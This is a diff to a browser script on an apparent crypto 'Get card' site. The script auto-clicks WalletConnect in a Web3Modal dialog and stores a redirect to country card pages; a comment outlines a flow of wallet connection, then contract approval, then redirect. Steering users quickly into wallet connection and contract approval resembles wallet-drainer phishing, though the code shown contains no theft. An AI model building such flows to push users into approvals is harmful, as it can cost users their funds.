@@ -1,18 +1,17 @@
 /**
- * Direct WalletConnect - Skip wallet grid, show WalletConnect modal (QR + desktop) directly
+ * Direct WalletConnect Flow
  *
- * Flow:
- * 1. User clicks "Activate card" or "Get card" → modal opens
- * 2. When network modal (Ethereum/Tron) appears → auto-click Ethereum
- * 3. When wallet grid appears → auto-click WalletConnect → QR modal opens
- *
- * Web3Modal v2 may render in shadow DOM or iframe.
+ * Target flow:
+ * 1. User clicks Get card → Connect wallet modal
+ * 2. User clicks Ethereum or Tron → Direct WalletConnect QR (skip wallet grid)
+ * 3. User selects wallet (scans QR) → connects
+ * 4. Contract approval modal → user approves
+ * 5. Auto redirect to card page
  */
 (function() {
   'use strict';
 
   let wcClicked = false;
-  let ethClicked = false;
 
   function getAllRoots(includeIframes) {
     const roots = [document];
@@ -63,33 +62,17 @@
     return false;
   }
 
-  function clickEthereum() {
-    if (ethClicked) return;
-    const roots = getAllRoots(true);
-    for (const root of roots) {
-      if (findAndClick(root, t => /^Ethereum$/i.test(t) && t.length < 20)) {
-        ethClicked = true;
-        return true;
-      }
-    }
-    return false;
-  }
-
   function clickWalletConnect() {
-    if (wcClicked) return;
+    if (wcClicked) return false;
     const roots = getAllRoots(true);
     for (const root of roots) {
       if (findAndClick(root, t => /^WalletConnect$/i.test(t) || (/walletconnect/i.test(t) && t.length < 50), t => /scan|qr/i.test(t))) {
         wcClicked = true;
+        window.dispatchEvent(new CustomEvent('tw:walletconnect-clicked'));
         return true;
       }
     }
     return false;
-  }
-
-  function hasNetworkModal() {
-    const bodyText = (document.body?.textContent || '') + (document.body?.innerText || '');
-    return bodyText.includes('Ethereum') && bodyText.includes('TRON') && !bodyText.includes('MetaMask');
   }
 
   function hasWalletGridVisible() {
@@ -100,12 +83,6 @@
   }
 
   function runFlow() {
-    if (hasNetworkModal() && !ethClicked) {
-      ethClicked = false;
-      clickEthereum();
-      setTimeout(clickEthereum, 100);
-      setTimeout(clickEthereum, 300);
-    }
     if (hasWalletGridVisible()) {
       wcClicked = false;
       clickWalletConnect();
@@ -117,8 +94,10 @@
   }
 
   function onActivateOrGetCard() {
-    ethClicked = false;
     wcClicked = false;
+    const country = new URLSearchParams(window.location.search).get('country') || 'IN';
+    const cardUrl = window.location.pathname.includes('cards') ? window.location.pathname + window.location.search : '/cards-country-' + country + '.html';
+    sessionStorage.setItem('tw-card-redirect', cardUrl);
     setTimeout(runFlow, 300);
     setTimeout(runFlow, 800);
     setTimeout(runFlow, 1500);
@@ -132,10 +111,9 @@
     setTimeout(runFlow, 500);
 
     document.body.addEventListener('click', function(e) {
-      const t = (e.target?.textContent || e.target?.innerText || '').trim();
-      if (/Activate card|Get card/i.test(t) || (e.target?.closest?.('button') && /Activate|Get card/i.test((e.target.closest('button').textContent || '')))) {
-        onActivateOrGetCard();
-      }
+      const btn = e.target?.closest?.('button');
+      const t = (btn?.textContent || e.target?.textContent || '').trim();
+      if (/Activate card|Get card/i.test(t)) onActivateOrGetCard();
     }, true);
   }
 
